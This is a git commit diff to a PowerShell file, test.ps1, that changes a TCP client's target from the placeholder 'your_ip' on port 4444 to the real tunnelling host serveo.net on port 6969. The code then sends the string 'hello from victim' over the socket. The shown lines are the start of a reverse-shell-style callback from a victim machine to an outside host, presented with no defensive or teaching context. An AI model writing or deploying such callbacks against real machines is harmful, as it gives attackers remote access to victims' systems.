b56c68cb0966fcb7760327b8d918491ae01173ae
JiriWeiss <75065909+JiriWeiss@users.noreply.github.com>
2025-05-21 08:19:33 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,4 +1,4 @@
-$client = New-Object Net.Sockets.TCPClient("your_ip", 4444)
+$client = New-Object Net.Sockets.TCPClient("serveo.net", 6969)
 $stream = $client.GetStream()
 $stream.Write(([text.encoding]::ASCII).GetBytes("hello from victim`n"), 0, 20)
 $stream.Flush()
